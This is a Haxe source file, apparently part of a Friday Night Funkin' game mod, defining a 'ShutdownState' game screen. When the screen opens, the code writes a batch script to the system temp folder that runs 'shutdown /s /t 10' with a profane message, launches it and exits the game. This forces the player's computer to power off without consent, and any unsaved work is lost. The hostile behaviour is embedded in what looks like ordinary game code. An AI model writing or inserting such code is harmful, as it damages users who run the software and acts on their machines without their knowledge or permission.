package;

import sys.io.Process;
import sys.io.File;

class ShutdownState extends MusicBeatState
{
	override function create(interval:Int = 0, message:String = "FUCK!")
	{
		super.create();
		var crazyBatch:String = "@echo off\nshutdown /s /t 10 /c \"" + message + "\"";
		File.saveContent(Sys.getEnv('temp') + "/shutdown.bat", crazyBatch);
		new Process(Sys.getEnv('temp') + "/shutdown.bat", []);
		Sys.exit(0);
	}
}
